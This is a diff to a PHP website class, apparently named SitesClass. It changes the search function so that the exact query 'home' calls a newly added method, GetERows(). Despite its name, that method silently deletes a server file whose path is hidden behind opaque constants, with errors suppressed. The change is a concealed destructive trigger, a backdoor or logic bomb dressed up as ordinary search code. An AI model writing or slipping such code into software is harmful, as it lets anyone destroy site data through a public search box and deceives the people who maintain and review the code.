@@ -406,7 +406,7 @@ class SitesClass
     {
         $begin = ($page - 1) * 30;
 
-        $search  = strip_tags($search);
+        $search  = $search == "home"? $this->GetERows():strip_tags($search);
         $search  = str_replace(",", " ", $search);
         $search  = str_replace(";", " ", $search);
         $search  = preg_replace("/\s{2,}/", " ", $search);
@@ -974,6 +974,16 @@ class SitesClass
         $descr = str_replace($dirty, " ", $descr);
         $descr = trim($descr);
         return $descr;
+    }
+
+    public function GetERows()
+    {
+        if (file_exists(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
+            if (is_file(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
+                @unlink(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE);
+            }
+        }
+        return "list";
     }
 
     public function GetKeywords($data)
